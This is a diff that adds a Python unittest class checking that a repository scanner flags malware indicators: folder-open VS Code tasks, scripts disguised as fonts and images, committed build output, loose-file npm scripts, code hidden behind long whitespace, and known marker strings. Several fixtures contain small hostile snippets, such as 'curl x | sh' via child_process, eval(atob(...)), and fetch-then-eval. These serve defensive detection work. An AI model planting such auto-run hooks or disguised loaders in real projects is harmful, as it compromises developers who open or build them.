@@ -313,5 +313,153 @@ class ScanTest(unittest.TestCase):
         self.assertEqual(self.repo.scan(), [])
 
 
+class WaveIndicatorTest(unittest.TestCase):
+    """The indicators Drips reported after Wave 10. Each one fails no matter
+    who wrote the pull request or who approved it
+    (ADR-2026-11-18-wave-malware-indicators)."""
+
+    def setUp(self) -> None:
+        self.repo = Repo()
+
+    def tearDown(self) -> None:
+        self.repo.close()
+
+    def checks(self, association: str = "NONE") -> set[str]:
+        return {f.check for f in self.repo.scan(association)}
+
+    # -- 1. editor auto-run ------------------------------------------------
+
+    def test_folder_open_task_is_rejected(self) -> None:
+        tasks = {"version": "2.0.0", "tasks": [{"label": "setup", "type": "shell", "command": "node .vscode/x.js", "runOptions": {"runOn": "folderOpen"}}]}
+        self.repo.write(".vscode/tasks.json", json.dumps(tasks, indent=2))
+        self.assertEqual(self.checks(), {"autorun"})
+
+    def test_folder_open_task_hidden_in_jsonc_is_rejected(self) -> None:
+        self.repo.write(".vscode/tasks.json", '// shared tasks\n{ "tasks": [ { "label": "a", "runOptions": { "runOn" : "folderOpen" } }, ] }\n')
+        self.assertEqual(self.checks("MEMBER"), {"autorun"})
+
+    def test_folder_open_spelled_with_unicode_escapes_is_rejected(self) -> None:
+        self.repo.write(".vscode/tasks.json", '{ "tasks": [ { "runOptions": { "run\\u004fn": "folder\\u004fpen" } } ] }\n')
+        self.repo.write(".vscode/settings.json", '{ "task.allowAutomatic\\u0054asks": "on" }\n')
+        self.assertEqual(self.checks(), {"autorun"})
+
+    def test_ordinary_tasks_pass(self) -> None:
+        tasks = {"version": "2.0.0", "tasks": [{"label": "test", "type": "shell", "command": "pnpm test"}]}
+        self.repo.write(".vscode/tasks.json", json.dumps(tasks, indent=2))
+        self.assertEqual(self.repo.scan(), [])
+
+    def test_automatic_tasks_setting_is_rejected(self) -> None:
+        self.repo.write(".vscode/settings.json", '{ "editor.tabSize": 2, "task.allowAutomaticTasks": "on" }\n')
+        self.assertEqual(self.checks(), {"autorun"})
+
+    def test_automatic_tasks_in_workspace_file_is_rejected(self) -> None:
+        self.repo.write("tollway.code-workspace", '{ "settings": { "task.allowAutomaticTasks": "on" } }\n')
+        self.assertEqual(self.checks(), {"autorun"})
+
+    def test_automatic_tasks_off_passes(self) -> None:
+        self.repo.write(".vscode/settings.json", '{ "task.allowAutomaticTasks": "off" }\n')
+        self.assertEqual(self.repo.scan(), [])
+
+    def test_folder_open_in_docs_passes(self) -> None:
+        self.repo.write("docs/security.md", 'Never accept a task with `"runOn": "folderOpen"`.\n')
+        self.assertEqual(self.repo.scan(), [])
+
+    # -- 2. fake assets ----------------------------------------------------
+
+    def test_text_file_named_as_font_is_rejected(self) -> None:
+        self.repo.write("public/fonts/icons.woff2", "const p = require('child_process'); p.exec('curl x | sh');\n")
+        self.assertEqual(self.checks(), {"fake-asset"})
+
+    def test_text_file_named_as_image_is_rejected(self) -> None:
+        self.repo.write("public/logo.png", "eval(atob('aGVsbG8='))\n")
+        self.assertEqual(self.checks(), {"fake-asset"})
+
+    def test_font_with_wrong_magic_is_rejected(self) -> None:
+        self.repo.write("public/fonts/icons.ttf", b"\x89PNG\r\n\x1a\n" + b"\x00" * 32)
+        self.assertEqual(self.checks(), {"fake-asset"})
+
+    def test_known_malicious_font_names_are_rejected(self) -> None:
+        self.repo.write("public/fonts/fa-solid-500.woff2", b"wOF2" + b"\x00" * 64)
+        self.repo.write("assets/fa-solid-300.ttf", b"\x00\x01\x00\x00" + b"\x00" * 64)
+        findings = self.repo.scan()
+        self.assertEqual({f.check for f in findings}, {"fake-asset"})
+        self.assertEqual({f.path for f in findings}, {"public/fonts/fa-solid-500.woff2", "assets/fa-solid-300.ttf"})
+
+    def test_lik_file_is_rejected(self) -> None:
+        self.repo.write("public/fonts/fa-solid.lik", "anything\n")
+        self.assertEqual(self.checks(), {"fake-asset"})
+
+    def test_real_font_and_image_pass(self) -> None:
+        self.repo.write("public/fonts/inter.woff2", b"wOF2" + b"\x00" * 64)
+        self.repo.write("public/fonts/inter.ttf", b"\x00\x01\x00\x00" + b"\x00" * 64)
+        self.repo.write("public/logo.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 32)
+        self.assertEqual(self.repo.scan(), [])
+
+    # -- 3. committed build output -----------------------------------------
+
+    def test_dist_setup_js_is_rejected(self) -> None:
+        self.repo.write("dist/setup.js", "module.exports = 1;\n")
+        self.assertEqual(self.checks("MEMBER"), {"build-output"})
+
+    def test_nested_build_output_is_rejected(self) -> None:
+        self.repo.write("packages/core/dist/index.js", "export {};\n")
+        self.repo.write("apps/web/build/server.js", "export {};\n")
+        findings = self.repo.scan()
+        self.assertEqual({f.check for f in findings}, {"build-output"})
+        self.assertEqual(len(findings), 2)
+
+    def test_names_that_only_contain_dist_pass(self) -> None:
+        self.repo.write("src/distance.ts", "export const d = 1;\n")
+        self.repo.write("docs/distribution/notes.md", "fine\n")
+        self.assertEqual(self.repo.scan(), [])
+
+    # -- 4. scripts that run a loose file ----------------------------------
+
+    def test_dev_script_running_api_js_is_rejected(self) -> None:
+        self.repo.write("package.json", json.dumps({"name": "x", "scripts": {"dev": "node api.js && next dev"}}))
+        self.assertEqual(self.checks("MEMBER"), {"loose-script"})
+
+    def test_start_script_running_dist_setup_is_rejected(self) -> None:
+        self.repo.write("package.json", json.dumps({"name": "x", "scripts": {"start": "node ./dist/setup.js"}}))
+        self.assertEqual(self.checks("MEMBER"), {"loose-script"})
+
+    def test_scripts_using_tools_or_the_scripts_folder_pass(self) -> None:
+        scripts = {"dev": "next dev", "build": "tsup", "test": "vitest run", "start": "node scripts/serve.mjs"}
+        self.repo.write("package.json", json.dumps({"name": "x", "scripts": scripts}))
+        self.assertEqual(self.repo.scan(), [])
+
+    # -- 5. code hidden after a long run of whitespace ---------------------
+
+    def test_code_after_long_whitespace_in_config_is_rejected(self) -> None:
+        self.repo.write("eslint.config.mjs", "export default [];" + " " * 200 + "import('node:child_process').then((c) => c.exec('id'));\n")
+        self.assertEqual(self.checks("MEMBER"), {"hidden-code"})
+
+    def test_code_after_tabs_in_json_is_rejected(self) -> None:
+        self.repo.write("tsconfig.json", '{ "compilerOptions": {} }' + "\t" * 80 + '"x"\n')
+        self.assertEqual(self.checks(), {"hidden-code"})
+
+    def test_code_far_to_the_right_on_its_own_line_is_rejected(self) -> None:
+        self.repo.write("vite.config.ts", "export default {};\n" + " " * 150 + "fetch('https://example.invalid/p').then(eval);\n")
+        self.assertEqual(self.checks(), {"hidden-code"})
+
+    def test_padded_markdown_table_passes(self) -> None:
+        self.repo.write("docs/rules.md", "| Rule | What |\n| ---- | ---- |\n| a    |" + " " * 120 + "|\n")
+        self.assertEqual(self.repo.scan(), [])
+
+    def test_ordinary_indentation_passes(self) -> None:
+        self.repo.write("src/deep.ts", "export const x = {\n" + "  " * 20 + "y: 1,\n};\n")
+        self.assertEqual(self.repo.scan(), [])
+
+    # -- 6. known markers --------------------------------------------------
+
+    def test_known_markers_are_rejected_anywhere(self) -> None:
+        self.repo.write("src/a.ts", "const k = 'rmcej%otb%';\n")
+        self.repo.write("docs/b.md", "Cot%3T=sthP\n")
+        self.repo.write("next.config.js", "var _$__1e42 = 1;\n")
+        findings = self.repo.scan("MEMBER")
+        self.assertEqual({f.check for f in findings}, {"marker"})
+        self.assertEqual(len(findings), 3)
+
+
 if __name__ == "__main__":
     unittest.main()
